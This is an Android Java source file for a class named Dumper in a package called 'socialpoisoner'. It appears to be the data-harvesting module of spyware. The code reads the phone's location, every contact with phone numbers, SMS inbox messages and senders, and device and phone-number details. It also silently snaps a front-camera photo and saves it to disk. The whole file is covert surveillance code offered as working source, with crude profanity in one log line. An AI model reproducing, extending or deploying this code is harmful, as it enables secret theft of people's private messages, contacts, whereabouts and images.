package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Properties;

/**
 * Created by doctorrabb on 15.07.16.
 */
public class Dumper {

    public JSONObject getLocation(Context context) {

        if (ActivityCompat.checkSelfPermission (context, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED) {

            final JSONObject jsonObject = new JSONObject();

            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

                Log.e("Error Getting Location", "User fucking shit :(");

                return null;
            }

            locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    1000 * 60 * 1,
                    10,
                    new LocationListener() {
                        @Override
                        public void onLocationChanged(Location location) {

                        }

                        @Override
                        public void onStatusChanged(String s, int i, Bundle bundle) {

                        }

                        @Override
                        public void onProviderEnabled(String s) {

                        }

                        @Override
                        public void onProviderDisabled(String s) {

                        }
                    }
            );

            if (locationManager != null) {
                try {
                    jsonObject.put("latitude", String.valueOf(locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER).getLatitude()));
                    jsonObject.put("longitude", String.valueOf(locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER).getLongitude()));
                } catch (JSONException e) {
                    Log.e("GetLocation Error", e.getMessage());
                }
            }


            return jsonObject;
        }
        return null;
    }

    public JSONArray dumpContacts (Context context) {

        JSONArray jsonArray = new JSONArray ();

        try {

            ContentResolver contentResolver = context.getContentResolver();
            Cursor cur = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));

                            try {
                                jsonArray.put(new JSONObject().put("name", name).put("num", phoneNo));
                            } catch (JSONException e) {
                                Log.e("Get Contatcts Error", e.getMessage());
                            }

                        }
                        pCur.close();
                    }
                }
            }
            return jsonArray;
        }
        catch (Exception e) {
        }
        return null;
    }

    public JSONArray dumpSMS (Context context) {

       try {

           Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

           JSONArray jsonObject = new JSONArray();
           cursor.moveToFirst();

           while (cursor.moveToNext()) {
               String body = cursor.getString(cursor.getColumnIndex("body")).toString();
               String address = cursor.getString(cursor.getColumnIndex("address")).toString();

               try {
                   jsonObject.put(new JSONObject().put("body", body).put("address", address));
               } catch (JSONException e) {
                   return null;
               }
           }

           cursor.close();

           Log.d("SMS JSON List", jsonObject.toString());

           return jsonObject;
       }
       catch (Exception e) {

       }

        return null;
    }

    public JSONObject dumpInfo (Context context) {

        JSONObject properties = new JSONObject ();
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        try {
            properties.put("phone_number", telephonyManager.getLine1Number());
            properties.put("mobile_operator", telephonyManager.getNetworkOperatorName());

            properties.put("device_model", Build.MODEL);
            properties.put("android_version", Build.VERSION.RELEASE);
            properties.put("android_version_codename", Build.VERSION.RELEASE);
        } catch (Exception e) {
            Log.e ("Get Information Error", e.getMessage());
        }

        return properties;

    }

    public void dumpFace (Context context) {

        if (ActivityCompat.checkSelfPermission (context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {

            Log.d("Front Camera ID", String.valueOf(Util.getFrontCamera()));

            try {
                Camera camera = Camera.open(Util.getFrontCamera());
                camera.takePicture(null, null, this.cameraDump());

                camera.release();
            } catch (Exception e) {
                Log.e ("Error getting face", e.getMessage());
            }
        }
    }

    public Camera.PictureCallback cameraDump () {
        Camera.PictureCallback pictureCallback = new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] bytes, Camera camera) {
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(constants.facePath);

                    fileOutputStream.write(bytes);
                    fileOutputStream.close();


                } catch (Exception e) {
                    Log.e ("Error taking face", e.getMessage());
                }
            }
        };

        return pictureCallback;
    }

}
